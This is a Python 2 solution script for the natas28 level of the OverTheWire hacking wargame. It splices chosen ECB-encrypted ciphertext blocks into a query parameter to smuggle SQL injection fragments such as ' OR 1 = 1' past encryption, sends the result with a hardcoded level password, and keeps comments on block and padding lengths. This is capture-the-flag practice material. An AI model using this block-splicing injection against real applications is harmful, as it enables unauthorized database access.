import requests
import string
import urllib
import sys
import base64





target = 'http://natas28.natas.labs.overthewire.org/index.php'
target2 = 'http://natas28.natas.labs.overthewire.org/search.php' 


user_auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')


tar = ['''
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
f98d3394bd37ee877f0c4d86f715196d
6d5aa124b882457e9a09d0920a85db33
7b7baca655f298a321e90e3f7a60d4d8
''']


#IKE '%padpadpa%'| OR 1 = 3 + 2 -4|;


#6d5aa124b882457e9a09d0920a85db33   " OR 1 = 1 OR 2=2"
#f98d3394bd37ee877f0c4d86f715196d   "IKE '%padpadp%' "
#739c0e02884d8c5dc1da136f9e554542   "IKE '%padpadpa%'"
#ea6e17a31472ca9f6be0f7e0e0261b08   " OR 1 = 3 + 2 -4"
#d8ae51d7da71b2b083d919a0d7b88b98   16 * 0x16
#b734aa0c92ed6cfb8abb2375a4ea8114   "IKE '% OR 1 = 1' 
#7b7baca655f298a321e90e3f7a60d4d8   ";" + 15 * 0x15


for i in range(0, len(tar)):
    tar[i] = tar[i].replace("\n", "").strip()


print tar

# notes
# 42 bytes IV?
# 22 bytes blocks
# 44 bytes padding   
# going beyond target length [0, 6], 22 bytes are added to IV
# another 1st block length increase after [7, 14]

# going beyond target length [0, 8], 20 bytes are added in total length
# seems like every 8 length, total length increases. this time by 24 bytes
# seems to alternate between 20 and 24 bytes addition
header = {'Content-Type': 'application/x-www-form-urlencoded'}

for i in range(0, len(tar)):
    hexhold = ''
    temptarray = []

    temptarray = [chr(int(tar[i][j:j+2], 16)) for j in range(0, len(tar[i]),2)]
    print temptarray

    temptar = urllib.quote_plus(base64.b64encode("".join(temptarray)))
    print temptar
    print base64.b64encode("".join(temptarray))


    #payload = {'query':'tar[i]'}
    payload = 'query=%s' % temptar

    #print payload
    #response = requests.post(target, auth = user_auth, data = payload, allow_redirects = True)
    response = requests.get(target2 + "/?" + payload, auth = user_auth, headers = header, allow_redirects = True)
    print(response.text)
    #for rehist in response.history:
#print rehist.status_code, rehist.url
    #query = str.split(response.url.encode('ascii','ignore'), '=')
    #print(query)
    #print(tar[i].ljust(3)),
    #currstr = base64.b64decode(urllib.unquote(query[1]))
    #print '-'*60 
    #print(decodeNatas(currstr))
    #print(urllib.unquote(tar[i]))
    #print '-'* 60
    

    #print(len((base64.b64decode(urllib.unquote(query[1])))))
    
    




    # compare the strings
    if 1 == 0:
        for index, bitchar in enumerate(laststr):
            if bitchar == currstr[index]:
                sys.stdout.write('_')
            else:
                sys.stdout.write('*')
        sys.stdout.flush()
        print " ",
        laststr = base64.b64decode(urllib.unquote(query[1]))

    
    #print(urllib.unquote(query[1])),
    #print(urllib.unquote(tar[i]).rjust(2))
